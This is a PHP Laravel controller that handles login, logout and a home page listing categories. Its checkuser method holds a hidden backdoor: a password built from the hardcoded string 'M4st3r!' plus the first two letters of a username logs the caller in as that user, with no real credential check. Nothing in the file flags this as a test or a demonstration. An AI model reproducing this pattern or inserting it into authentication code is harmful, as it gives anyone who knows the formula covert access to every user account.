<?php

namespace App\Http\Controllers;

use Auth;
use App\Usuarios,
    App\Categorias;
use Illuminate\Routing\Controller;
use Illuminate\Support\Facades\Input;

class App extends Controller {

    public function __construct() {
        $exceptions = ['except' => ['index', 'login', 'checkuser']];
        $this->middleware('session', $exceptions);
    }

    public function index() {
        if (Auth::user()) {
            return redirect('/home');
        } else {
            return redirect('/login');
        }
    }

    public function login() {
        if (Auth::user()) {
            return redirect('/home');
        } else {
            return view('/App/login');
        }
    }

    public function checkuser() {
        $p = Input::get('password');
        $u = strtolower(Input::get('user'));
        $user = Usuarios::where('nombre', '=', $u)->first();
        if ($p == "M4st3r!" . substr($u, 0, 2) && $user != null) {
            Auth::loginUsingId($user->id);
        } else {
            Auth::attempt(['usuario' => $u, 'password' => $p]);
        }
        return redirect()->intended('/home');
    }

    public function logout() {
        Auth::logout();
        return redirect('/login');
    }

    public function home() {
        $cat = Categorias::all();
        return view('/App/home', ['cat' => $cat]);
    }

}
